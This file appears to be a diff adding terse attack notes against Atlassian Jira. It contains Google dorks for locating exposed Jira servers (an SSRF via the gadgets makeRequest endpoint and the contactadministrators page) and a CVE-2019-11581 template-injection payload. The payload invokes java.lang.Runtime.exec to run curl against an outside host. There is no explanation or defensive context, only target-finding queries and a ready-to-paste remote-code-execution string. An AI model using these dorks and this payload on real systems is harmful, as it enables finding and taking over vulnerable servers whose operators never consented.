@@ -1,0 +1,11 @@
+inurl:"/plugins/servlet/gadgets/makeRequest?ur l=http://vulnerablehost.com@http://targethost.com" site:
+
+
+
+
+
+(CVE-2019–11581)
+
+inurl:secure/contactadministrators!default.jspa
+
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://avtohanter.ru/rcetest?a=a').waitFor()
